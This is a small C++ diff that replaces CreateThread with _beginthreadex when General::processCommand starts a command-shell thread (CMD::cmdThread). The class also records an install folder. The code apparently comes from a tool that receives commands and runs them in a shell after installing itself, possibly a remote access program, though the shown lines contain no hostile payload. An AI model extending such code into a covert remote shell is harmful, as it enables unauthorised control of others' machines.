@@ -1,4 +1,5 @@
 #include "general.h"
+#include <process.h>
 
 std::string General::currentPath;			//current path of executable
 std::string General::installFolder;		//path of folder it should be installed to
@@ -300,7 +301,7 @@ std::string General::processCommand(std::string command)
 				buffer[command.length()] = '\0';
 				strcpy_s(buffer, command.length() + 2, command.c_str());
 
-				CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
+				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
 				while (!CMD::cmdOpen)
 				{
 					Sleep(50);
